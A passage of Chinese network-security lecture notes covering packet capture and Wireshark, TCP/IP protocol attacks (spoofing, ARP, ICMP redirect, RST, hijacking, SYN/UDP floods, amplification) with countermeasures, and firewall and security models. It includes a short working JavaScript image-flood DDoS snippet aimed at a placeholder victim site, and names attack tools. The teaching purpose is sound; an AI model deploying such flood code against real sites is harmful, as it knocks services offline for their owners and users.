RRDTools</p></li><li><p>原始数据包粒度网络协议分析对网络上传输的二进制格式数据包进行解析，以恢复出各层网络协议信息以及传输内容的技术方法。</p></li></ul><h2 id="11-9-网络协议分析技术实现"><a href="#11-9-网络协议分析技术实现" class="headerlink" title="11.9 网络协议分析技术实现"></a>11.9 网络协议分析技术实现</h2><ul><li><p>实现参考源码</p><p>–Snort中的网络解码器模块</p><p>–decode.c/decode.h</p></li><li><p>解析以太网数据帧 DecodeEthPkt</p><p>–预处理：拆包前进行一些前期处理</p><p>–拆包：将当前得到的包内存位置赋给Packet数据结构中相应的指针eh(EtherHdr)型的指针即可</p><p>–解析上层协议： switch语句，根据ether_type分别调用相应的上层协议解析例程</p></li></ul><h2 id="11-10-Wireshark-ethereal"><a href="#11-10-Wireshark-ethereal" class="headerlink" title="11.10 Wireshark(ethereal)"></a>11.10 Wireshark(ethereal)</h2><ul><li><p>Wireshark特性</p><p>–图形化界面/命令行(tshark)</p><p>–在线/离线抓包(支持标准pcap二进制日志文件)</p><p>–支持BPF过滤器</p><p>–支持分析几百种常见网络协议</p><p>–跨平台：类UNIX、Win32(依赖libpcap/WinPcap)</p></li></ul><h3 id="11-10-1-Wireshark基本功能"><a href="#11-10-1-Wireshark基本功能" class="headerlink" title="11.10.1 Wireshark基本功能"></a>11.10.1 Wireshark基本功能</h3><ul><li><p>抓包(Capture)</p><p>–Capture Filter: BPF过滤器</p></li><li><p>分析(Analyze)</p><p>–自动协议解码: 支持数百种协议, 显示各层包头和内容字段</p><p>–灵活选择协议对网络流进行解码Decode As…</p></li><li><p>统计(Statistics)</p><p>–协议分类(Protocol Hierarchy)</p><p>–会话列表(Conversations)</p><ul><li>2层(以太网)/3层(IP)/4层(TCP,UDP)</li></ul><p>–会话终端(EndPoints)</p><p>–I/O Graph: 随时间统计的流量曲线</p><p>–会话重组(Follow TCP/UDP Stream)(Flow Graph)</p></li></ul><h3 id="11-10-2-Wireshark中的两类过滤规则"><a href="#11-10-2-Wireshark中的两类过滤规则" class="headerlink" title="11.10.2 Wireshark中的两类过滤规则"></a>11.10.2 Wireshark中的两类过滤规则</h3><ul><li><p>嗅探过滤规则</p><p>–支持BPF规则</p><p>–用于嗅探抓包时的过滤</p></li><li><p>显示过滤规则</p><p>–用于在界面中选择显示哪些数据包</p><p>–与BPF规则有所不同</p></li></ul><h2 id="11-11-流重组-会话重组"><a href="#11-11-流重组-会话重组" class="headerlink" title="11.11 流重组/会话重组"></a>11.11 流重组/会话重组</h2><ul><li><p>流重组/会话重组</p><p>–TCP/UDP会话发送字节数可能很大</p><p>–IP包最大长度(64K-20≈64K)</p><p>–以太网帧最大长度(1500-20=1480)</p><p>–协议栈发送大量TCP/UDP报文时，必然分组传送</p><p>–流重组: 将同属于一个TCP/UDP会话的IP包负载按序重新组装，还原应用层数据的过程</p></li><li><p>流重组工具</p><p>–Wireshark: Follow TCP/UDP Stream</p><p>–nstreams:</p><ul><li>nstreams -f pcap_file &gt; nstreams.txt</li></ul><p>–Snort:</p><ul><li><p>Log规则(snort.conf): log tcp any any &lt;&gt; any any (sid:1000001; session: printable;)</p></li><li><p>snort -r pcap_file –l ./log -csnort.conf</p></li></ul></li></ul><h2 id="11-12-网络流记录和高层统计分析"><a href="#11-12-网络流记录和高层统计分析" class="headerlink" title="11.12 网络流记录和高层统计分析"></a>11.12 网络流记录和高层统计分析</h2><ul><li><p>Netflow</p><p>–定义了网络会话流记录的业界标准-Cisco</p></li><li><p>RFC 3334/3954/3955</p><p>–IP Flow Information Export (netflowv10)-IETF</p></li><li><p>网络流记录</p><p>–商业路由器、交换机支持Netflow日志输出</p><p>–开源软件: nfdump(支持Netflow标准), Argus</p></li><li><p>网络流分析</p><p>–基于pcap文件上的流重组和统计分析</p></li><li><p>Wireshark: 协议分类/会话列表…</p></li><li><p>SnifferPro</p><p>–NetflowAnalyzer: HP openview/cacti/nfsen</p></li></ul><h2 id="11-13-嗅探实例——网站指纹"><a href="#11-13-嗅探实例——网站指纹" class="headerlink" title="11.13 嗅探实例——网站指纹"></a>11.13 嗅探实例——网站指纹</h2><h1 id="12-TCP-IP网络协议攻击"><a href="#12-TCP-IP网络协议攻击" class="headerlink" title="12. TCP/IP网络协议攻击"></a>12. TCP/IP网络协议攻击</h1><h2 id="12-1-网络安全属性"><a href="#12-1-网络安全属性" class="headerlink" title="12.1 网络安全属性"></a>12.1 网络安全属性</h2><ul><li><p>网络安全CIA属性</p><p>–保密性(Confidentiality)</p><p>–完整性(Integrity)</p><p>–可用性(Availability)</p></li><li><p>其他三个补充属性</p><p>–真实性(Authentication)</p><p>–不可抵赖性(Non-Repudiation) </p><p>–可审查性(Accountability)</p></li></ul><h2 id="12-2-网络攻击基本模式"><a href="#12-2-网络攻击基本模式" class="headerlink" title="12.2 网络攻击基本模式"></a>12.2 网络攻击基本模式</h2><p>在 x. 800和 RFC 2828中使用的一种有用的安全攻击分类方法是被动攻击和主动攻击。</p><h3 id="12-2-1-被动攻击"><a href="#12-2-1-被动攻击" class="headerlink" title="12.2.1 被动攻击"></a>12.2.1 被动攻击</h3><p>被动攻击试图从系统中学习或使用信息，但不影响系统资源。</p><p>被动攻击的本质是窃听或监听传输。对手的目标是获取正在传输的信息。被动攻击有两种类型:</p><ul><li>发布消息内容</li></ul><ul><li>流量分析——监控流量，以确定通信主机的位置和身份，并可以观察交换消息的频率和长度</li></ul><p>这些攻击很难发现，因为它们不涉及对数据的任何更改。</p><h3 id="12-2-2-主动攻击"><a href="#12-2-2-主动攻击" class="headerlink" title="12.2.2 主动攻击"></a>12.2.2 主动攻击</h3><p>主动攻击包括修改数据流或创建虚假数据流，可以细分为4个类别: 伪装、重放、篡改消息和分布式拒绝服务攻击：</p><ul><li>把一个实体伪装成另一个实体</li></ul><ul><li>重播以前的讯息</li></ul><ul><li>修改/改变传输中的信息以产生未经授权的效果</li></ul><ul><li>分布式拒绝服务攻击——防止或抑制通讯设施的正常使用或管理</li></ul><p>主动攻击呈现出与被动攻击相反的特征。虽然被动攻击很难被发现，但可以采取措施防止其成功。另一方面，由于潜在的物理、软件和网络漏洞种类繁多，要完全防止主动攻击是相当困难的。相反，我们的目标是检测主动攻击，并从它们造成的任何干扰或延迟中恢复。</p><h3 id="12-2-3-对攻击的一般处理原则"><a href="#12-2-3-对攻击的一般处理原则" class="headerlink" title="12.2.3 对攻击的一般处理原则"></a>12.2.3 对攻击的一般处理原则</h3><ul><li><p>被动攻击 – 侧重于阻止</p><p>—容易阻止</p><p>—难于检测</p></li><li><p>主动攻击 – 侧重于检测与恢复</p><p>—难于阻止</p><p>—容易检测</p></li></ul><p>考虑安全服务的作用，可能需要什么。注意到两个的异同与传统的纸质文件，例如：</p><ul><li>有签名、日期；</li><li>需要从披露的保护、篡改或销毁；</li><li>可经公证和见证；</li><li>可以记录或许可。 </li></ul><h3 id="12-2-4-中间人攻击-MITM攻击"><a href="#12-2-4-中间人攻击-MITM攻击" class="headerlink" title="12.2.4 中间人攻击(MITM攻击)"></a>12.2.4 中间人攻击(MITM攻击)</h3><ul><li><p>通信双方</p><p>–Alice &amp; Bob</p></li><li><p>中间人</p><p>–Mallory</p><p>–与通信双方建立起各自独立的会话连接</p><p>–对双方进行身份欺骗</p><p>–进行消息的双向转发</p><p>–必要前提：拦截通信双方的全部通信(截获)、转发篡改消息(篡改)、双方身份欺骗(伪造)</p><p>–现实世界中的中间人攻击–国际象棋欺骗术</p></li></ul><h2 id="12-3-安全缺陷与攻击技术"><a href="#12-3-安全缺陷与攻击技术" class="headerlink" title="12.3 安全缺陷与攻击技术"></a>12.3 安全缺陷与攻击技术</h2><h2 id="12-4-原始报文伪造技术及工具"><a href="#12-4-原始报文伪造技术及工具" class="headerlink" title="12.4 原始报文伪造技术及工具"></a>12.4 原始报文伪造技术及工具</h2><ul><li><p>原始报文伪造技术</p><p>–伪造出特制的网络数据报文并发送</p><p>–原始套接字(Raw Socket)</p></li><li><p>Netwox/Netwag</p><p>–超过200个不同功能的网络报文生成与发送工具</p><p>–#netwoxnumber [parameters … ]</p></li></ul><h3 id="12-4-1-Netwox工具使用"><a href="#12-4-1-Netwox工具使用" class="headerlink" title="12.4.1 Netwox工具使用"></a>12.4.1 Netwox工具使用</h3><ul><li><p>Netwox: 命令行</p></li><li><p>Netwag: 窗口, TCL支持</p></li><li><p>Wireshark捕获网络包</p></li><li><p>工具32：伪造以太网包</p></li></ul><h2 id="12-5-网络层协议攻击"><a href="#12-5-网络层协议攻击" class="headerlink" title="12.5 网络层协议攻击"></a>12.5 网络层协议攻击</h2><h3 id="12-5-1-IP源地址欺骗"><a href="#12-5-1-IP源地址欺骗" class="headerlink" title="12.5.1 IP源地址欺骗"></a>12.5.1 IP源地址欺骗</h3><ul><li><p>IP源地址欺骗</p><p>–伪造具有虚假源地址的IP数据包进行发送</p><p>–目的：隐藏攻击者身份、假冒其他计算机</p></li><li><p>IP源地址欺骗原理</p><p>–路由转发只是用目标IP地址，不对源做验证</p><p>–现实世界中的平信</p><p>–通常情况：无法获得响应包</p></li></ul><ul><li><p>假冒IP攻击</p><ul><li><p>可以嗅探响应包的环境</p><p>​    –同一局域网</p><p>​    –ARP欺骗、重定向攻击劫持响应包</p></li><li><p>盲攻击(blind attack)</p><p>​    –Robert T. Morris在1985年提出</p><p>​    –Kevin Mitinick在1995年仍使用</p><p>​    –通过猜测TCP三次握手中所需的信息，假冒IP建立起TCP连接</p></li></ul></li></ul><h4 id="12-5-1-1-TCP连接的基本信息"><a href="#12-5-1-1-TCP连接的基本信息" class="headerlink" title="12.5.1.1 TCP连接的基本信息"></a>12.5.1.1 TCP连接的基本信息</h4><p>五元组(srcip(源IP), srcport, dstip, dstport, proto)</p><p>反映传输状态(seq, ack)</p><h4 id="12-5-1-2-盲攻击过程"><a href="#12-5-1-2-盲攻击过程" class="headerlink" title="12.5.1.2 盲攻击过程"></a>12.5.1.2 盲攻击过程</h4><h4 id="12-5-1-3-IP源地址欺骗技术的应用场景"><a href="#12-5-1-3-IP源地址欺骗技术的应用场景" class="headerlink" title="12.5.1.3 IP源地址欺骗技术的应用场景"></a>12.5.1.3 IP源地址欺骗技术的应用场景</h4><ul><li><p>普遍应用场景</p><p>–拒绝服务攻击：无需或不期望响应包，节省带宽，隐藏攻击源</p><p>–网络扫描(nmap -D)：将真正扫描源隐藏于一些欺骗的源IP地址中</p></li><li><p>假冒IP攻击场景</p><p>–对付基于IP地址的身份认证机制</p><ul><li><p>类Unix平台上的主机信任关系</p></li><li><p>防火墙或服务器中配置的特定IP访问许可</p></li></ul><p>–远程主机IP欺骗-盲攻击，较难成功</p></li></ul><h4 id="12-5-1-4-利用Netwox进行IP源地址欺骗"><a href="#12-5-1-4-利用Netwox进行IP源地址欺骗" class="headerlink" title="12.5.1.4 利用Netwox进行IP源地址欺骗"></a>12.5.1.4 利用Netwox进行IP源地址欺骗</h4><p>工具34/38</p><h4 id="12-5-1-5-IP源地址欺骗的防范措施"><a href="#12-5-1-5-IP源地址欺骗的防范措施" class="headerlink" title="12.5.1.5 IP源地址欺骗的防范措施"></a>12.5.1.5 IP源地址欺骗的防范措施</h4><ul><li><p>使用随机化的初始序列号以避免远程的盲攻击</p></li><li><p>使用网络层安全传输协议如IPsec</p><p>–避免泄露高层协议可供利用的信息及传输内容</p></li><li><p>避免采用基于IP地址的信任策略</p><p>–以基于加密算法的用户身份认证机制来替代</p></li><li><p>在路由器和网关上实施包检查和过滤</p><p>–入站过滤机制(ingress filtering)</p><p>–出站过滤机制(egress filtering)</p></li></ul><h3 id="12-5-2-ARP欺骗"><a href="#12-5-2-ARP欺骗" class="headerlink" title="12.5.2 ARP欺骗"></a>12.5.2 ARP欺骗</h3><ul><li><p>ARP协议工作原理</p><p>–将网络主机的IP地址解析成其MAC地址</p><p>–①每台主机设备上都拥有一个ARP缓存(ARP Cache)</p><p>–②检查自己的ARP缓存，有，直接映射，无，广播ARP请求包</p><p>–③检查数据包中的目标IP地址是否与自己的IP地址一致，如一致，发送ARP响应，告知MAC地址</p><p>–④源节点在收到这个ARP响应数据包后，将得到的目标主机IP地址和MAC地址对映射表项添加到自己的ARP缓存中</p></li></ul><h4 id="12-5-2-1-ARP欺骗攻击技术原理"><a href="#12-5-2-1-ARP欺骗攻击技术原理" class="headerlink" title="12.5.2.1 ARP欺骗攻击技术原理"></a>12.5.2.1 ARP欺骗攻击技术原理</h4><p>ARP欺骗：发送伪造ARP消息，对特定IP所对应的MAC地址进行假冒欺骗，从而达到恶意目的。</p><ul><li>网关ARP欺骗</li></ul><h4 id="12-5-2-2-ARP欺骗技术的应用场景"><a href="#12-5-2-2-ARP欺骗技术的应用场景" class="headerlink" title="12.5.2.2 ARP欺骗技术的应用场景"></a>12.5.2.2 ARP欺骗技术的应用场景</h4><ul><li><p>利用ARP欺骗进行交换网络中的嗅探</p></li><li><p>ARP欺骗构造中间人攻击，从而实施TCP会话劫持</p></li><li><p>ARP病毒</p></li><li><p>ARP欺骗挂马</p></li></ul><h4 id="12-5-2-3-利用Netwox进行ARP欺骗"><a href="#12-5-2-3-利用Netwox进行ARP欺骗" class="headerlink" title="12.5.2.3 利用Netwox进行ARP欺骗"></a>12.5.2.3 利用Netwox进行ARP欺骗</h4><p>工具33</p><h4 id="12-5-2-4-ARP欺骗攻击防范措施"><a href="#12-5-2-4-ARP欺骗攻击防范措施" class="headerlink" title="12.5.2.4 ARP欺骗攻击防范措施"></a>12.5.2.4 ARP欺骗攻击防范措施</h4><ul><li><p>静态绑定关键主机的IP地址与MAC地址映射关系</p><p>–网关/关键服务器</p><p>–“arp -s IP地址 MAC地址类型”</p></li><li><p>使用相应的ARP防范工具</p><p>–ARP防火墙</p></li><li><p>使用VLAN虚拟子网细分网络拓扑</p></li><li><p>加密传输数据以降低ARP欺骗攻击的危害后果</p></li></ul><h3 id="12-5-3-ICMP路由重定向攻击"><a href="#12-5-3-ICMP路由重定向攻击" class="headerlink" title="12.5.3 ICMP路由重定向攻击"></a>12.5.3 ICMP路由重定向攻击</h3><ul><li><p>ICMP路由重定向攻击</p><p>–伪装成路由器发送虚假的ICMP路由路径控制报文</p><p>–使受害主机选择攻击者指定的路由路径</p><p>–攻击目的：嗅探或假冒攻击</p></li><li><p>技术原理</p><p>–路由器告知主机：“应该使用的路由器IP地址”</p></li></ul><h4 id="12-5-3-1-ICMP路由重定向攻击技术"><a href="#12-5-3-1-ICMP路由重定向攻击技术" class="headerlink" title="12.5.3.1 ICMP路由重定向攻击技术"></a>12.5.3.1 ICMP路由重定向攻击技术</h4><ul><li><p>攻击节点冒充网关IP，向被攻击节点发送ICMP重定向报文，并将指定的新路由器IP地址设置为攻击节点</p></li><li><p>被攻击节点接受报文，选择攻击节点作为其新路由器(即网关)</p></li><li><p>攻击节点可以开启路由转发，实施中间人攻击</p></li><li><p>“谎言还是真话”？</p></li></ul><h4 id="12-5-3-2-ICMP路由重定向攻击防范"><a href="#12-5-3-2-ICMP路由重定向攻击防范" class="headerlink" title="12.5.3.2 ICMP路由重定向攻击防范"></a>12.5.3.2 ICMP路由重定向攻击防范</h4><ul><li>根据类型过滤一些ICMP数据包</li><li>设置防火墙过滤</li><li>对于ICMP重定向报文判断是不是来自本地路由器</li></ul><h2 id="12-6-传输层协议攻击"><a href="#12-6-传输层协议攻击" class="headerlink" title="12.6 传输层协议攻击"></a>12.6 传输层协议攻击</h2><h3 id="12-6-1-TCP-RST攻击"><a href="#12-6-1-TCP-RST攻击" class="headerlink" title="12.6.1 TCP RST攻击"></a>12.6.1 TCP RST攻击</h3><ul><li><p>中断攻击</p><p>–伪造TCP重置报文攻击(spoofed TCP reset packet)</p><p>–TCP重置报文将直接关闭掉一个TCP会话连接</p><p>–限制条件：通讯目标方接受TCP包</p></li><li><p>通讯源IP地址及端口号一致</p></li><li><p>序列号(Seq)落入TCP窗口之内</p><p>–嗅探监视通信双方的TCP连接，获得源、目标IP地址及端口</p><p>–结合IP源地址欺骗技术伪装成通信一方，发送TCP重置报文给通信另一方</p></li><li><p>应用场景：恶意拒绝服务攻击、重置入侵连接、GFW</p><p>–GFW: “net::ERR_CONNECTION_RESET”</p></li></ul><p>例：针对Google检索的 TCP RESET</p><p>p4-36-41</p><h3 id="12-6-2-TCP会话劫持"><a href="#12-6-2-TCP会话劫持" class="headerlink" title="12.6.2 TCP会话劫持"></a>12.6.2 TCP会话劫持</h3><ul><li><p>结合嗅探、欺骗技术</p></li><li><p>中间人攻击：注射额外信息，暗中改变通信</p></li><li><p>计算出正确的 seq，ackseq 即可</p></li><li><p>TCP会话攻击工具</p><p>–Juggernaut、Hunt、TTY watcher、IP watcher</p></li></ul><h4 id="12-6-2-1-Hunt工具介绍"><a href="#12-6-2-1-Hunt工具介绍" class="headerlink" title="12.6.2.1 Hunt工具介绍"></a>12.6.2.1 Hunt工具介绍</h4><ul><li><p>源码开放的自由软件，可运行在Linux平台上</p></li><li><p>功能特点</p><p>–监听当前网络上的会话</p><p>–重置会话(reset a session)</p><p>–劫持会话</p><ul><li>在劫持之后，使连接继续同步</li></ul><p>–确定哪些主机在线</p><p>–四个守护进程</p><ul><li>自动reset</li><li>Arp欺骗包的转发</li><li>收集MAC地址</li><li>具有搜索功能的sniffer</li></ul></li></ul><h4 id="12-6-2-2-会话劫持的防范措施"><a href="#12-6-2-2-会话劫持的防范措施" class="headerlink" title="12.6.2.2 会话劫持的防范措施"></a>12.6.2.2 会话劫持的防范措施</h4><ul><li><p>避免攻击者成为通信双方的中间人</p><p>–部署交换式网络，用交换机代替集线器</p><p>–禁用主机上的源路由</p><p>–采用静态绑定IP-MAC映射表以避免ARP欺</p><p>–过滤ICMP重定向报文</p></li><li><p>TCP会话加密(IPsec协议)</p><p>–避免了攻击者在得到传输层的端口及序列号等关键信息</p></li><li><p>防火墙配置</p><p>–限制尽可能少量的外部许可连接的IP地址</p></li><li><p>检测</p><p>–ACK风暴：ACK包的数量明显增加</p></li></ul><h3 id="12-6-3-TCP-SYN-Flood"><a href="#12-6-3-TCP-SYN-Flood" class="headerlink" title="12.6.3 TCP SYN Flood"></a>12.6.3 TCP SYN Flood</h3><ul><li><p>拒绝服务攻击(DoS)</p><p>–破坏可用性</p></li><li><p>TCP SYN Flood</p><p>–SYN洪泛攻击</p><p>–利用TCP三次握手协议的缺陷</p><p>–大量的伪造源地址的SYN连接请求</p><p>–消耗目标主机的连接队列资源</p><p>–不能够为正常用户提供服务</p></li></ul><h4 id="12-6-3-1-利用Netwox进行TCP-SYN-Flood"><a href="#12-6-3-1-利用Netwox进行TCP-SYN-Flood" class="headerlink" title="12.6.3.1 利用Netwox进行TCP SYN Flood"></a>12.6.3.1 利用Netwox进行TCP SYN Flood</h4><p>工具76</p><h4 id="12-6-3-2-SYN-Flood攻击防范措施-SynCookie"><a href="#12-6-3-2-SYN-Flood攻击防范措施-SynCookie" class="headerlink" title="12.6.3.2 SYN Flood攻击防范措施-SynCookie"></a>12.6.3.2 SYN Flood攻击防范措施-SynCookie</h4><ul><li><p>弥补TCP连接建立过程资源分配这一缺陷</p></li><li><p>无状态的三次握手</p><p>–服务器收到一个SYN报文后,不立即分配缓冲区</p><p>–利用连接的信息生成一个cookie, 作为SEQ</p><p>–客户端返回ACK中带着ACK = cookie+1</p><p>–服务器端核对cookie, 通过则建立连接，分配资源</p></li></ul><ul><li><p>有状态防火墙</p><p>–网络中的TCP连接进行状态监控和处理</p><p>–维护TCP连接状态：NEW状态、GOOD状态、BAD状态…</p><p>–三次握手‖代理</p></li></ul><h3 id="12-6-4-UDP-Flood攻击"><a href="#12-6-4-UDP-Flood攻击" class="headerlink" title="12.6.4 UDP Flood攻击"></a>12.6.4 UDP Flood攻击</h3><ul><li><p>UDP协议</p><p>–无状态不可靠</p><p>–仅仅是传输数据报</p></li><li><p>UDP Flood</p><p>–带宽耗尽型拒绝服务攻击</p><p>–分布式拒绝服务攻击(DDoS)</p><p>–利用僵尸网络控制大量受控傀儡主机</p><p>–通常会结合IP源地址欺骗技术</p></li></ul><h4 id="12-6-4-1-UDP-Flood攻击防范措施"><a href="#12-6-4-1-UDP-Flood攻击防范措施" class="headerlink" title="12.6.4.1 UDP Flood攻击防范措施"></a>12.6.4.1 UDP Flood攻击防范措施</h4><ul><li><p>禁用或过滤监控和响应服务</p></li><li><p>禁用或过滤其它的UDP 服务</p></li><li><p>网络关键位置使用防火墙和代理机制来过滤掉一些非预期的网络流量</p></li><li><p>遭遇带宽耗尽型拒绝服务攻击</p><p>–终端无能为力</p><p>–补救措施：网络扩容、转移服务器位置</p><p>–事件响应：汇报给安全应急响应部门、追溯和处置</p><p>–流量清洗解决方案：ISP为关键客户/服务所提供</p></li></ul><h4 id="12-6-4-2-另类DoS攻击"><a href="#12-6-4-2-另类DoS攻击" class="headerlink" title="12.6.4.2 另类DoS攻击"></a>12.6.4.2 另类DoS攻击</h4><h5 id="12-6-4-2-1-流量放大攻击"><a href="#12-6-4-2-1-流量放大攻击" class="headerlink" title="12.6.4.2.1 流量放大攻击"></a>12.6.4.2.1 流量放大攻击</h5><ul><li>对单个较小的UDP请求包回复以一个较大的UDP响应包的服务，可被用来放大 DOS 攻击</li><li>攻击者伪造网络包，将其源地址设为受害者的 IP 地址，当服务产生响应时，大量的数据会发向受害者的地址。</li><li>攻击者需要提供这类服务的大量地址以展开攻击，否则的话，受害者只需简单地丢弃来自这些少量地址的分组就能避免攻击。</li></ul><p>常用的UDP放大器</p><ul><li><p>DNS：ANY 查询将返回服务器所拥有的域的所有记录</p></li><li><p>NTP：MONLIST 返回最近询问时间的 600 个客户端</p></li></ul><p>时至今日，虽然两者都考虑过配置错误的问题, 但在Internet上，保存有十万计的错误配置主机。</p><h5 id="12-6-4-2-2-Javascript-based-DDoS-攻击"><a href="#12-6-4-2-2-Javascript-based-DDoS-攻击" class="headerlink" title="12.6.4.2.2 Javascript-based DDoS 攻击"></a>12.6.4.2.2 Javascript-based DDoS 攻击</h5><ul><li>简单的一段攻击代码attack.js</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">imgflood</span><span class="params">()</span> &#123;</span><br><span class="line">  var TARGET = <span class="string">&#x27;victim-website.com&#x27;</span></span><br><span class="line">  var URI = <span class="string">&#x27;/index.php?&#x27;</span></span><br><span class="line">  var pic = new Image()</span><br><span class="line">  var rand = Math.<span class="built_in">floor</span>(Math.random() * <span class="number">1000</span>)</span><br><span class="line">  pic.src = <span class="string">&#x27;http://&#x27;</span>+TARGET+URI+rand+<span class="string">&#x27;=val&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>场景1</p><p>场景2</p><p>场景3</p><p>解决方案</p><h2 id="12-7-TCP-IP网络协议栈攻击防范措施"><a href="#12-7-TCP-IP网络协议栈攻击防范措施" class="headerlink" title="12.7 TCP/IP网络协议栈攻击防范措施"></a>12.7 TCP/IP网络协议栈攻击防范措施</h2><h3 id="12-7-1-监测、预防与安全加固"><a href="#12-7-1-监测、预防与安全加固" class="headerlink" title="12.7.1 监测、预防与安全加固"></a>12.7.1 监测、预防与安全加固</h3><ul><li><p>网络接口层–主要安全威胁是网络嗅探</p><p>–局域网中的监听点检测</p><p>–网络设计上尽量细分和优化网络结构</p><p>–关键路径上的网关、路由器等设备的严格安全防护</p><p>–各类网络采用上层的加密通信协议</p></li><li><p>互联层</p><p>–多种检测和过滤技术来发现和阻断网络中欺骗攻击</p><p>–增强防火墙、路由器和网关设备的安全策略(egress filtering)</p><p>–关键服务器使用静态绑定IP-MAC映射表、使用IPsec协议加密通讯等预防机制</p></li><li><p>传输层：加密传输和安全控制机制(身份认证，访问控制)</p></li><li><p>应用层：加密，用户级身份认证，数字签名技术，授权和访问控制技术以及主机安全技术如审计、入侵检测</p></li></ul><h3 id="12-7-2-网络安全协议"><a href="#12-7-2-网络安全协议" class="headerlink" title="12.7.2 网络安全协议"></a>12.7.2 网络安全协议</h3><ul><li><p>网络接口层</p><p>–无线：WPA/WPA2</p><p>–统一认证：802.1X</p></li><li><p>网络互联层</p><p>–IPsec协议簇</p><p>–AH协议：完整性、认证、抗重放攻击</p><p>–ESP协议：机密性、数据源验证、抗重放、完整性</p></li><li><p>传输层</p><p>–TLS/SSL: 加密、可靠</p></li><li><p>应用层</p><p>–HTTPS、S/MIME、SET</p></li></ul><h1 id="13-网络安全防护技术"><a href="#13-网络安全防护技术" class="headerlink" title="13. 网络安全防护技术"></a>13. 网络安全防护技术</h1><h2 id="13-1-安全模型-P2DR模型"><a href="#13-1-安全模型-P2DR模型" class="headerlink" title="13.1 安全模型-P2DR模型"></a>13.1 安全模型-P2DR模型</h2><h3 id="13-1-1-信息安全技术与安全模型的发展"><a href="#13-1-1-信息安全技术与安全模型的发展" class="headerlink" title="13.1.1 信息安全技术与安全模型的发展"></a>13.1.1 信息安全技术与安全模型的发展</h3><ul><li><p>COMSEC –通信安全</p><p>–保护军事等机密信息，机密(Confidentiality)</p><p>–专门针对机密性的BLP(Bell-La Padula)多级安全策略模型</p></li><li><p>COMPSEC -计算机安全</p><p>–完整性(Integrity)也被纳入了核心安全属性</p><p>–引入身份认证、访问控制技术</p><p>–针对完整性保护的Biba模型和Clark-Wilson模型</p></li><li><p>NETSEC -网络安全</p><p>–网络信息服务的可用性(Availability)也上升成为核心的安全属性</p></li><li><p>IA –信息保障(NSA)</p><p>–机密性、完整性、可用性、真实性、不可抵赖性</p><p>–信息保障体系；纵深安全防护体系</p></li></ul><h3 id="13-1-2-安全评估模型与标准"><a href="#13-1-2-安全评估模型与标准" class="headerlink" title="13.1.2 安全评估模型与标准"></a>13.1.2 安全评估模型与标准</h3><ul><li><p>安全评估</p><p>–评估信息系统是否能够满足特定的安全需求和属性</p></li><li><p>安全评估模型</p><p>–1985：美国可信计算机安全评估准则TCSEC《桔皮书》</p></li><li><p>分级评估：A\B\C\D</p><p>–199x：欧洲ITSEC安全测评标准</p><p>–1999：Common Criteria(CC)标准</p><p>–1999：GB17859《计算机信息系统安全保护等级划分标准》</p></li><li><p>静态安全模型VS. 动态安全模型(可适应安全模型)</p></li></ul><h3 id="13-1-3-PDR安全模型"><a href="#13-1-3-PDR安全模型" class="headerlink" title="13.1.3 PDR安全模型"></a>13.1.3 PDR安全模型</h3><ul><li><p>PDR: 基于时间的安全(Time-based Security)</p><p>–可以量化，可以计算</p><p>–防御延缓攻击时间，及时的检测和响应</p></li></ul><p>PDR的最基本的意思是，认为安全有三个不可或缺的功能要素：防护、检测、响应。</p><p>Pt：整个防护体系的整体防护时间</p><p>Dt：检测时间</p><p>Rt：响应时间</p><p>要达到安全，就要$Pt&gt;Dt+Rt$</p><h3 id="13-1-4-P2DR安全模型"><a href="#13-1-4-P2DR安全模型" class="headerlink" title="13.1.4 P2DR安全模型"></a>13.1.4 P2DR安全模型</h3><p>美国ISS公司提出的动态网络安全体系的代表模型，也是动态安全模型的雏形。</p><p>网络安全是相对的，没有绝对的安全。</p><p>根据风险分析制定安全策略(Policy)，PDR构成动态闭环。</p><ul><li><p>P: 执行安全防护策略</p><p>防火墙、身份认证、访问控制、加密</p></li><li><p>D: 实时检测</p><p>漏洞评估、入侵检测</p></li><li><p>R: 实时响应</p><p>应急响应、备份恢复、灾难恢复</p></li></ul><h2 id="13-2-P：防御技术"><a href="#13-2-P：防御技术" class="headerlink" title="13.2 P：防御技术"></a>13.2 P：防御技术</h2><ul><li><p>网络防御-边界网络安全设备</p><p>–网络访问控制：防火墙，VPN</p><p>–网络内容控制：SCM</p><p>–IPS（入侵防御系统）, IMS(入侵管理系统), UTM（统一威胁管理）</p></li><li><p>主机防御</p><p>–漏洞扫描和补丁管理</p><p>–个人防火墙</p><p>–防病毒软件</p><p>–系统诊断与恢复软件</p></li><li><p>安全产业“老三样”: 防火墙、入侵检测、防病毒</p></li><li><p>安全产业“新三样”: 安全管理平台、安全服务、个人安全防御</p></li></ul><h3 id="13-2-1-防火墙-FireWall"><a href="#13-2-1-防火墙-FireWall" class="headerlink" title="13.2.1 防火墙(FireWall)"></a>13.2.1 防火墙(FireWall)</h3><ul><li>防火墙是一项协助确保信息安全的设备，会依照特定的规则，允许或是限制传输的数据通过。</li><li>置于不同的网络安全域之间，对网络流量或访问行为实施访问控制的安全组件或设备。</li><li>大楼的“门卫”</li></ul><h4 id="13-2-1-1-防火墙技术关键特性"><a href="#13-2-1-1-防火墙技术关键特性" class="headerlink" title="13.2.1.1 防火墙技术关键特性"></a>13.2.1.1 防火墙技术关键特性</h4><ul><li><p>只能对流经的网络数据进行检查控制：边界部署</p></li><li><p>不具备主动检测网络攻击数据能力，需合理设计安全控制策略</p></li><li><p>并非“一劳永逸”的“安全最终解决方案”</p></li></ul><h4 id="13-2-1-2-功能"><a href="#13-2-1-2-功能" class="headerlink" title="13.2.1.2 功能"></a>13.2.1.2 功能</h4><ul><li><p>在网络协议栈的各个层次上实施网络访问控制机制</p><p>–网络层：包过滤</p><p>–传输层：电路级代理</p><p>–应用层：应用层代理/网关</p></li><li><p>基本功能：控制在计算机网络中不同信任程度网络域间传送的数据流</p><p>–检查控制进出网络的网络流量</p><p>–防止脆弱或不安全的协议和服务</p><p>–防止内部网络信息的外泄</p><p>–对网络存取和访问进行监控审计</p><p>–防火墙可以强化网络安全策略并集成其他安全防御机制</p></li></ul><h4 id="13-2-1-3-不足"><a href="#13-2-1-3-不足" class="headerlink" title="13.2.1.3 不足"></a>13.2.1.3 